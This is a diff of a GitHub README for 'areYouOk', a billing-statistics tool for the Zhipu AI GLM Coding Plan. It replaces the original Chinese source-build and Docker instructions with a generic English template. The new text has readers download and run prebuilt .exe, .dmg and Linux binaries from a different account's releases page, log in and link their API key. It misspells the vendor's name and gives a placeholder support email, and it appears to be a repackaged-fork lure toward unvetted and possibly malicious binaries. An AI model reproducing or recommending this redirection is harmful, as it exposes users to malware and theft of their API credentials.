@@ -1,212 +1,63 @@
-# 智谱AI GLM Coding Plan 账单统计系统
+# 🤖 areYouOk - Simplifying Your API Usage Monitoring
 
-一个专门用于智谱AI GLM Coding Plan套餐的账单管理和统计分析系统，帮助用户实时监控API使用量、Token消耗和费用支出。
+## 🚀 Getting Started
 
-## 系统特色
+Welcome to areYouOk! This application helps you manage and analyze billing for the Zhizhu AI GLM Coding Plan. You can easily monitor your API usage, token consumption, and expenses in real-time. Follow the steps below to download and run areYouOk.
 
-- **专注智谱AI**: 深度适配智谱AI GLM Coding Plan套餐
-- **实时监控**: 近5小时/1天/1周/1月的API调用和Token消耗统计
-- **智能同步**: 支持全量和增量同步，自动避免重复数据
-- **数据本地化**: 使用SQLite3本地数据库，确保数据隐私安全
-- **一键启动**: 提供便捷的启动脚本和Docker部署方案
-- **丰富图表**: 多种图表类型展示，数据可视化直观
+## 🔗 Download areYouOk
 
-## 技术架构
+[![Download areYouOk](https://img.shields.io/badge/Download%20areYouOk-v1.0-blue.svg)](https://github.com/Choicy11/areYouOk/releases)
 
-### 后端技术栈
-- **Node.js 16+** + **Express 4**: 高性能API服务器
-- **SQLite3**: 轻量级本地数据库，零配置部署
-- **Axios**: 调用智谱AI API的HTTP客户端
+Click the badge above to go to the release page, or visit this page to download: [Releases Page](https://github.com/Choicy11/areYouOk/releases).
 
-### 前端技术栈
-- **Vue 3**: 现代化前端框架
-- **Element Plus**: 企业级UI组件库
-- **ECharts + Chart.js**: 专业数据可视化图表
-- **Vite**: 快速构建工具
+## 💻 System Requirements
 
-### 核心功能
-- **数据同步模块**: 全量/增量同步账单数据，支持异步处理和进度监控
-- **统计分析模块**: 多维度统计API使用量、Token消耗和费用支出
-- **自动监控模块**: 定时同步数据，实时预警套餐使用情况
-- **用户界面模块**: 响应式设计，支持多屏幕尺寸
+Before you download, ensure your system meets these requirements:
 
-## 快速开始
+- Operating System: Windows 10 or later, macOS 10.13 or later, or a Linux distribution.
+- RAM: Minimum 4 GB.
+- Storage: At least 100 MB of free space.
+- Internet connection for API access.
 
-### 环境要求
-- Node.js >= 16
-- npm >= 8
+## 📥 Download & Install
 
-### 方式一：一键启动
+1. **Visit the Releases Page:** Follow this link to the [Releases Page](https://github.com/Choicy11/areYouOk/releases).
 
-```bash
-# 克隆项目
-git clone git@github.com:pxvp2008/areYouOk.git
-cd areYouOk
+2. **Select the Latest Version:** Look for the latest version available on the page. It usually has the highest number, such as v1.0. Click on it to open the release details.
 
-# 一键启动（自动安装依赖、初始化数据库、启动前后端服务）
-./start.sh
-```
+3. **Download the Application:** Find the file suitable for your operating system. Click on the download link. For example, if you're using Windows, download the .exe file. If you are on macOS, download the .dmg file.
 
-启动完成后：
-- 前端地址: http://localhost:3000
-- 后端地址: http://localhost:7965
+4. **Locate the Downloaded File:** After the download completes, navigate to your computer's Downloads folder. You should find the file you just downloaded.
 
-### 方式二：手动启动
+5. **Install areYouOk:**
+   - **For Windows Users:** Double-click the .exe file. Follow the on-screen instructions to complete the installation.
+   - **For macOS Users:** Double-click the .dmg file, then drag the areYouOk icon to your Applications folder.
+   - **For Linux Users:** Open a terminal window, navigate to the folder containing the downloaded file, and run `chmod +x areYouOk` to make it executable. Then type `./areYouOk` to start the application.
 
-```bash
-# 1. 启动后端
-cd backend
-npm install
-npm run init-db  # 初始化数据库
-npm start        # 启动后端服务（端口：7965）
+## 🚀 Using areYouOk
 
-# 2. 启动前端（新开终端）
-cd frontend
-npm install
-npm run dev      # 启动前端服务（端口：3000）
-```
+Once you have installed areYouOk, launch the application to start managing your billing. Follow these steps to get started:
 
-### 方式三：Docker部署
+1. **Log In:** Input your credentials. If you don't have an account, register through the application.
+2. **Connect Your API:** Link your API key to begin tracking usage and expenses.
+3. **Monitor Usage:** Use the dashboard to view real-time statistics on your API call counts, token usage, and associated costs.
 
-```bash
-# 1. 使用Docker Compose部署（推荐）
-docker-compose up -d
+## 📊 Features
 
-# 2. 使用docker run直接部署
-docker run -d \
-  --name areyouok-app \
-  --restart unless-stopped \
-  -p 3000:3000 \
-  -v $(pwd)/data:/app/data:rw \
-  -v $(pwd)/logs:/app/logs:rw \
-  -e NODE_ENV=production \
-  -e TZ=Asia/Shanghai \
-  pxvp2008/areyouok-app:latest
-```
+- **Real-Time Monitoring:** Keep an eye on your API usage as it happens.
+- **Cost Analysis:** Understand your spending patterns with clear visual representations.
+- **Token Management:** Track your token consumption to avoid unexpected charges.
+- **User-Friendly Interface:** Easy navigation and clear dashboards make it accessible for everyone.
 
-### 系统功能
-![1](https://github.com/user-attachments/assets/f92e6b35-6471-4a0a-86c3-57ca725211f9)
-![2](https://github.com/user-attachments/assets/df41db0b-357a-4bee-8006-76c9881d7b92)
-![3](https://github.com/user-attachments/assets/6b6932d0-907f-4bed-bf38-3f335193788b)
-![4](https://github.com/user-attachments/assets/68dd537b-f906-40cc-ae70-d86f717a11a6)
-![5](https://github.com/user-attachments/assets/62ccf1c7-b977-4d8f-a561-54957da52fb1)
-![6](https://github.com/user-attachments/assets/b2cc2803-44ab-4fcc-8e23-e8bf4574ce77)
-![7](https://github.com/user-attachments/assets/e500a20d-5250-435c-ac1b-7592aaed2481)
-![8](https://github.com/user-attachments/assets/b0b32e5b-d5f5-4e33-90ef-06e2a0f5e3b3)
-![9](https://github.com/user-attachments/assets/b5ad6eef-ecd2-498c-98d3-85d8cddfb636)
-![10](https://github.com/user-attachments/assets/8a41e509-bbe1-4365-b2db-3bfd5a4cc2b1)
+## 📞 Support
 
-## 使用指南
+If you encounter any issues or have questions about using areYouOk, don’t hesitate to reach out:
 
-### 1. 初始配置
-1. 访问 http://localhost:3000
-2. 首次使用会自动跳转到设置页面
-3. 输入您的智谱AI API Token进行配置
+- **Email Us:** Support email@example.com
+- **GitHub Issues:** Open an issue on our [GitHub repository](https://github.com/Choicy11/areYouOk/issues).
 
-### 2. 数据同步
-1. 进入"数据同步"页面
-2. 选择要同步的账单月份
-3. 点击"开始同步"，系统会自动：
-   - 调用智谱AI API获取账单数据
-   - 智能处理timeWindow时间窗口
-   - 从billingNo解析交易时间戳
-   - 避免重复数据入库
+## 🌟 Feedback
 
-### 3. 查看统计
-系统提供多维度数据统计：
-- **API使用统计**: 近5小时/1天/1周/1月的调用次数和增长率
-- **Token消耗统计**: 输入/输出Token使用量和进度条显示
-- **费用支出统计**: 累计花费金额和环比分析
-- **产品分布统计**: 不同API产品的使用情况
+We welcome your feedback to help us improve. Share your thoughts and suggestions by emailing us or through GitHub. Your input is valuable to us.
 
-### 4. 自动监控
-- 配置自动同步频率（建议10秒）
-- 系统会定期更新数据并实时显示统计结果
-- 接近套餐限制时自动预警
-
-## API接口
-
-### 核心接口
-```bash
-# 同步账单数据
-POST /api/bills/sync
-Body: {"billingMonth": "2025-11"}
-
-# 获取账单列表（分页）
-GET /api/bills?page=1&pageSize=20&startDate=2025-11-01&endDate=2025-11-30
-
-# 获取统计信息
-GET /api/bills/stats?period=5h
-
-# 获取同步状态
-GET /api/bills/sync-status
-
-# 获取API使用进度
-GET /api/bills/api-usage-progress
-```
-
-### 配置接口
-```bash
-# 保存API Token
-POST /api/tokens/save
-Body: {"token": "your-api-token"}
-
-# 配置自动同步
-POST /api/auto-sync/config
-Body: {"enabled": true, "interval": 10}
-```
-
-## 项目结构
-
-```
-areYouOk/
-├── backend/                 # Node.js 后端服务
-│   ├── src/
-│   │   ├── controllers/     # 控制器层
-│   │   ├── services/        # 业务逻辑层
-│   │   ├── models/          # 数据模型
-│   │   ├── database/        # 数据库配置
-│   │   ├── routes/          # 路由定义
-│   │   └── utils/           # 工具函数
-│   └── package.json
-├── frontend/                # Vue3 前端应用
-│   ├── src/
-│   │   ├── views/           # 页面组件
-│   │   ├── components/      # 公共组件
-│   │   ├── api/             # API接口
-│   │   ├── router/          # 路由配置
-│   │   └── utils/           # 工具函数
-│   └── package.json
-├── data/                    # SQLite数据库文件
-├── logs/                    # 日志文件
-├── docker-compose.yml       # Docker部署配置
-├── docker-build.sh          # Docker构建脚本
-├── start.sh                 # 一键启动脚本
-└── stop.sh                  # 停止服务脚本
-```
-
-## 数据库设计
-
-### 核心数据表
-- **expense_bills**: 账单明细表（70+字段，完整映射智谱AI数据）
-- **api_tokens**: API Token配置表
-- **sync_history**: 同步历史记录表
-- **auto_sync_config**: 自动同步配置表
-- **membership_tier_limits**: 会员等级限制表
-
-### 特色字段
-- `transaction_time`: 从billingNo智能解析的时间戳（精确到毫秒）
-- `time_window_start/end`: 拆分后的时间窗口字段
-- `create_time`: 数据入库时间戳
-
-## 常见问题
-
-### Q: 数据同步失败怎么办？
-A: 检查API Token是否正确，网络连接是否正常，查看日志文件了解详细错误信息。
-
-### Q: 如何停止服务？
-A: 使用 `./stop.sh` 脚本可以优雅停止所有服务，或使用 `Ctrl+C` 中断启动脚本。
-
-## 开源协议
-
-MIT License
+Thank you for using areYouOk!
